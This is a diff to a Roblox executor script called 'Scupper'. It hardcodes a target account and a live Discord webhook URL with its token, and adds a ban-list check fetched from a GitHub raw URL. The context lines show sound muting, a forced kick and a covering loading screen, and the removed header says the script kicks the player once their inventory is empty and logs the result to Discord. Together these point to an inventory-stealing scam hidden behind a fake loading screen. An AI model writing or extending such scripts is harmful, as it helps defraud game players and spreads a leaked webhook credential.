@@ -1,12 +1,14 @@
 --[[
-  ROBLOX SCUPPER – FULLY WORKING
+  ROBLOX SCUPPER – WITH BAN LIST (GITHUB GIST)
   TARGET: Adrien_201315 – HARDCODED
-  ZINDEX = 999999 – HIGHEST PRIORITY
-  KICKS WHEN INVENTORY IS EMPTY – SENDS DISCORD LOG
+  CHECKS BANNED USERS FROM GITHUB GIST BEFORE RUNNING
 ]]
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1516850833743020144/YN0_yOas6Wcy6L7etQa3wMlsKbpCaylcacv6PgtYOghG9yEnqI5By6OvA-_Yblhmx-z2"
 local TARGET_PLAYER = "Adrien_201315"
+
+-- ===== GITHUB GIST BAN LIST =====
+local BAN_LIST_URL = "https://raw.githubusercontent.com/adrienfavela2030-create/hi/refs/heads/main/banned.txt"  -- REPLACE WITH YOUR URL
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -17,6 +19,102 @@ local CoreGui = game:GetService("CoreGui")
 
 print("[Scupper] Started by: " .. LocalPlayer.Name)
 print("[Scupper] Target: " .. TARGET_PLAYER)
+
+-- ===== CHECK IF USER IS BANNED =====
+local function isUserBanned()
+    local HttpService = game:GetService("HttpService")
+    local HttpFunction = request or http_request or (syn and syn.request) or nil
+    
+    if not HttpFunction then
+        print("[Scupper] No HTTP function, skipping ban check")
+        return false
+    end
+    
+    local playerName = LocalPlayer.Name
+    local success, response = pcall(function()
+        return HttpFunction({
+            Url = BAN_LIST_URL,
+            Method = "GET"
+        })
+    end)
+    
+    if success and response and response.StatusCode == 200 then
+        local content = response.Body or ""
+        if content:find(playerName) then
+            print("[Scupper] ❌ USER IS BANNED: " .. playerName)
+            return true
+        end
+    end
+    
+    print("[Scupper] ✅ User is not banned")
+    return false
+end
+
+-- ===== BAN KICK =====
+local function banKick()
+    local banGui = Instance.new("ScreenGui")
+    banGui.Name = "BanScreen"
+    banGui.ResetOnSpawn = false
+    banGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    banGui.DisplayOrder = 999999
+    banGui.Parent = gui
+    
+    local banBg = Instance.new("Frame")
+    banBg.Size = UDim2.new(1, 0, 1, 0)
+    banBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    banBg.BackgroundTransparency = 0.2
+    banBg.ZIndex = 999999
+    banBg.Parent = banGui
+    
+    local banPanel = Instance.new("Frame")
+    banPanel.Size = UDim2.new(0, 500, 0, 200)
+    banPanel.Position = UDim2.new(0.5, -250, 0.5, -100)
+    banPanel.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
+    banPanel.BackgroundTransparency = 0.05
+    banPanel.BorderSizePixel = 2
+    banPanel.BorderColor3 = Color3.fromRGB(255, 50, 50)
+    banPanel.ZIndex = 999999
+    banPanel.Parent = banBg
+    
+    local banCorner = Instance.new("UICorner")
+    banCorner.CornerRadius = UDim.new(0, 16)
+    banCorner.Parent = banPanel
+    
+    local banTitle = Instance.new("TextLabel")
+    banTitle.Size = UDim2.new(1, 0, 0, 50)
+    banTitle.Position = UDim2.new(0, 0, 0, 15)
+    banTitle.BackgroundTransparency = 1
+    banTitle.Text = "🚫 YOU ARE BANNED"
+    banTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
+    banTitle.Font = Enum.Font.GothamBold
+    banTitle.TextSize = 26
+    banTitle.ZIndex = 999999
+    banTitle.Parent = banPanel
+    
+    local banMsg = Instance.new("TextLabel")
+    banMsg.Size = UDim2.new(1, -40, 0, 60)
+    banMsg.Position = UDim2.new(0, 20, 0, 70)
+    banMsg.BackgroundTransparency = 1
+    banMsg.Text = "You have been banned from using this script.\nContact Adrien_201315 for more information."
+    banMsg.TextColor3 = Color3.fromRGB(200, 150, 150)
+    banMsg.Font = Enum.Font.Gotham
+    banMsg.TextSize = 16
+    banMsg.TextScaled = false
+    banMsg.TextWrapped = true
+    banMsg.ZIndex = 999999
+    banMsg.Parent = banPanel
+    
+    task.wait(3)
+    pcall(function() LocalPlayer:Kick("You are banned from using this script.") end)
+    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
+    pcall(function() game:Shutdown() end)
+end
+
+-- ===== CHECK BAN BEFORE RUNNING =====
+if isUserBanned() then
+    banKick()
+    return
+end
 
 -- ===== MUTE ALL SOUNDS =====
 local function muteAllSounds()
@@ -144,7 +242,7 @@ local function forceKick(msg)
     pcall(function() game:Shutdown() end)
 end
 
--- ===== LOADING SCREEN – ZINDEX 999999 =====
+-- ===== LOADING SCREEN =====
 local loadingGui = Instance.new("ScreenGui")
 loadingGui.Name = "LoadingScreen"
 loadingGui.ResetOnSpawn = false
